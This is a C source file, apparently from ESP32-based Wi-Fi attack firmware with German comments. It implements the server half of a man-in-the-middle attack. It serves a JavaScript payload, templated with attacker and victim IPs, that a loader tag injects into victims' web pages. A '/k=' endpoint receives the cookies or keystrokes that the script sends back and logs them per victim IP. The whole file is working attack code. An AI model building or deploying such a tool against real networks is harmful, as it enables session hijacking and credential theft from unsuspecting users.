#include "wlan_mitm_server.h"
#include "wlan_cred_sniff.h"
#include "wlan_hal.h"
#include "wlan_html_inject.h"

#include <esp_http_server.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <stdio.h>
#include <string.h>

#define TAG "WlanMitmServer"

static httpd_handle_t s_server = NULL;
static struct WlanCredSniff* s_cs = NULL;

// ---------------------------------------------------------------------------
// kleine URL-Decode-Helper (% + +) für den Pfad nach /k=
// ---------------------------------------------------------------------------

static int hex_val(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void url_decode(const char* in, char* out, int out_max) {
    int i = 0, o = 0;
    while(in[i] && o < out_max - 1) {
        if(in[i] == '%' && in[i + 1] && in[i + 2]) {
            int h = hex_val(in[i + 1]);
            int l = hex_val(in[i + 2]);
            if(h >= 0 && l >= 0) {
                uint8_t v = (uint8_t)((h << 4) | l);
                out[o++] = (v >= 0x20 && v < 0x7f) ? (char)v : '?';
                i += 3;
                continue;
            }
        }
        if(in[i] == '+') {
            out[o++] = ' ';
            i++;
        } else {
            uint8_t c = (uint8_t)in[i++];
            out[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
        }
    }
    out[o] = 0;
}

static uint32_t get_client_ip(httpd_req_t* req) {
    int sockfd = httpd_req_to_sockfd(req);
    if(sockfd < 0) return 0;
    struct sockaddr_in6 addr;
    socklen_t addr_size = sizeof(addr);
    if(getpeername(sockfd, (struct sockaddr*)&addr, &addr_size) != 0) return 0;
    if(addr.sin6_family == AF_INET6) {
        // IPv4-mapped IPv6 (::ffff:a.b.c.d): letzte 4 Bytes sind die v4-IP.
        if(IN6_IS_ADDR_V4MAPPED(&addr.sin6_addr)) {
            uint32_t v4;
            memcpy(&v4, &addr.sin6_addr.s6_addr[12], 4);
            return v4;
        }
        return 0;
    }
    struct sockaddr_in* v4 = (struct sockaddr_in*)(void*)&addr;
    return v4->sin_addr.s_addr;
}

// ---------------------------------------------------------------------------
// /code Handler — liefert den User-JS-Payload (alert/cookies/logger/custom)
// als application/javascript aus. Ersetzt %%MY_IP%% und %%VICTIM_IP%% on the
// fly: MY_IP kommt aus dem WiFi-HAL, VICTIM_IP ist die Source des aktuellen
// HTTP-Requests. Das eigentliche HTML-Inject ist nur ein winziger Loader
// (<script src="//<MY_IP>/code">) — siehe wlan_html_inject.c.
// ---------------------------------------------------------------------------

#define MITM_PAYLOAD_RAW_MAX 1024
#define MITM_PAYLOAD_RENDERED_MAX 1280

static int append_str(char* out, int out_max, int o, const char* s) {
    if(!s) return o;
    int n = (int)strlen(s);
    if(o + n > out_max) n = out_max - o;
    if(n > 0) {
        memcpy(out + o, s, (size_t)n);
        o += n;
    }
    return o;
}

static int append_ipv4(char* out, int out_max, int o, uint32_t ip) {
    const uint8_t* b = (const uint8_t*)&ip;
    char buf[16];
    int n = snprintf(buf, sizeof(buf), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
    if(n <= 0) return o;
    return append_str(out, out_max, o, buf);
}

// Mini-render: ersetzt %%MY_IP%% und %%VICTIM_IP%%. Unbekannte Variablen
// werden 1:1 durchgeschoben.
static int render_payload(
    char* out, int out_max, const char* tmpl, int tmpl_len,
    uint32_t my_ip, uint32_t victim_ip) {
    int o = 0, i = 0;
    while(i < tmpl_len && o < out_max) {
        if(i + 4 <= tmpl_len && tmpl[i] == '%' && tmpl[i + 1] == '%') {
            const char* var = tmpl + i + 2;
            int max_var = tmpl_len - i - 2 - 1;
            int var_len = -1;
            for(int j = 0; j < max_var; j++) {
                if(var[j] == '%' && j + 1 < max_var + 1 && var[j + 1] == '%') {
                    var_len = j;
                    break;
                }
            }
            if(var_len > 0) {
                if(var_len == 5 && memcmp(var, "MY_IP", 5) == 0) {
                    o = append_ipv4(out, out_max, o, my_ip);
                    i += 2 + var_len + 2;
                    continue;
                }
                if(var_len == 9 && memcmp(var, "VICTIM_IP", 9) == 0) {
                    o = append_ipv4(out, out_max, o, victim_ip);
                    i += 2 + var_len + 2;
                    continue;
                }
            }
        }
        out[o++] = tmpl[i++];
    }
    return o;
}

static esp_err_t handler_code(httpd_req_t* req) {
    uint32_t victim_ip = get_client_ip(req);
    char raw[MITM_PAYLOAD_RAW_MAX];
    uint32_t raw_len = wlan_html_inject_get_payload(raw, sizeof(raw));
    if(raw_len == 0) {
        httpd_resp_set_type(req, "application/javascript");
        httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_send(req, "", 0);
        return ESP_OK;
    }
    uint32_t my_ip = wlan_hal_get_own_ip();
    static char rendered[MITM_PAYLOAD_RENDERED_MAX];
    int rendered_len = render_payload(
        rendered, (int)sizeof(rendered), raw, (int)raw_len, my_ip, victim_ip);

    httpd_resp_set_type(req, "application/javascript");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, rendered, rendered_len);
    return ESP_OK;
}

// ---------------------------------------------------------------------------
// /k=<value> Handler
// ---------------------------------------------------------------------------

static esp_err_t handler_k(httpd_req_t* req) {
    const char* uri = req->uri;
    if(strncmp(uri, "/k=", 3) != 0) {
        httpd_resp_send_404(req);
        return ESP_OK;
    }
    const char* raw_value = uri + 3;
    // Bis ? oder # oder Ende — alles dahinter (Query-String, Fragment) ignorieren.
    char clean[128];
    int i = 0;
    while(raw_value[i] && raw_value[i] != '?' && raw_value[i] != '#' &&
          i < (int)sizeof(clean) - 1) {
        clean[i] = raw_value[i];
        i++;
    }
    clean[i] = 0;

    char decoded[128];
    url_decode(clean, decoded, sizeof(decoded));

    if(s_cs && decoded[0]) {
        uint32_t client_ip = get_client_ip(req);
        wlan_cred_sniff_push_log(s_cs, client_ip, decoded);
    }

    httpd_resp_set_type(req, "text/plain");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_sendstr(req, "ok");
    return ESP_OK;
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------
// httpd_start ruft intern lwip_socket() — das braucht pthread-TLS, was nur in
// echten xTaskCreate-Tasks korrekt initialisiert ist (FuriThreads crashen in
// pthread_getspecific). Daher dispatchen wir Start/Stop an den WlanHal-Worker
// (analog wlan_evil_portal).

static void mitm_server_start_worker(void* arg) {
    (void)arg;
    if(s_server) return;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    // Wildcard-Matcher, damit /k=* alles unter /k= matched.
    config.uri_match_fn = httpd_uri_match_wildcard;
    // Wir brauchen nur einen URI-Handler, aber paar Sockets reserviert lassen
    // damit parallele Inject-Callbacks gleichzeitig funktionieren.
    config.max_uri_handlers = 4;
    config.max_open_sockets = 4;
    config.lru_purge_enable = true;
    if(httpd_start(&s_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        s_server = NULL;
        return;
    }
    httpd_uri_t uri_k = {
        .uri = "/k=*",
        .method = HTTP_GET,
        .handler = handler_k,
        .user_ctx = NULL,
    };
    if(httpd_register_uri_handler(s_server, &uri_k) != ESP_OK) {
        ESP_LOGW(TAG, "register /k= failed");
    }
    httpd_uri_t uri_code = {
        .uri = "/code",
        .method = HTTP_GET,
        .handler = handler_code,
        .user_ctx = NULL,
    };
    if(httpd_register_uri_handler(s_server, &uri_code) != ESP_OK) {
        ESP_LOGW(TAG, "register /code failed");
    }
}

static void mitm_server_stop_worker(void* arg) {
    (void)arg;
    if(s_server) {
        httpd_stop(s_server);
        s_server = NULL;
    }
}

void wlan_mitm_server_start(struct WlanCredSniff* cs) {
    if(s_server) return;
    s_cs = cs;
    if(!wlan_hal_run_in_worker(mitm_server_start_worker, NULL)) {
        ESP_LOGE(TAG, "worker dispatch failed");
        s_cs = NULL;
    }
}

void wlan_mitm_server_stop(void) {
    if(!s_server) {
        s_cs = NULL;
        return;
    }
    wlan_hal_run_in_worker(mitm_server_stop_worker, NULL);
    s_cs = NULL;
}

bool wlan_mitm_server_running(void) {
    return s_server != NULL;
}
